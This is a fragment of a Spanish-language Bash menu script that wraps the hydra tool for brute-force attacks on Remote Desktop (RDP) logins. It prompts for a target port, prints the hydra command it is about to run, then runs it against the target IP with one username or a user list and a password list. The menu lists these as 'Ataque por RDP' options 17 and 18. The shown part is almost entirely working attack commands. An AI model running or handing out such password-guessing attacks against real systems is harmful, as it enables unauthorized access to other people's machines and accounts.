...
echo ""
echo -e "\e[33m Ingrese Puerto \e[0m - \e[31m Ejemplo: 3389 \e[0m"
echo ""
read puerto
...
echo ""
echo            "       *****************************************************************************"
echo -e         "       * Comando = \e[33m  hydra -l $user -P $passwd rdp://$ip:$puerto -t 4 -vV -I    \e[0m*"
echo            "       *****************************************************************************"
...
hydra -l $user -P $passwd rdp://$ip:$puerto -t 4 -vV -I
...
echo ""
echo            "       *****************************************************************************"
echo -e         "       * Comando = \e[33m hydra -L $users -P $passwd rdp://$ip:$puerto -t 4 -vV -I    \e[0m*"
echo            "       *****************************************************************************"
...
hydra -L $users -P $passwd rdp://$ip:$puerto -t 4 -vV -I
...
echo ""
	...
	echo -e "\e[33m \t17) \e[0m Ataque por RDP (1 User)"------------------------------------"\e[33m \t18) \e[0m Ataque por RDP (User_List y Passwd_List)"
	echo ""
	echo -e "\e[33m \t19) \e[0m Salir\n"
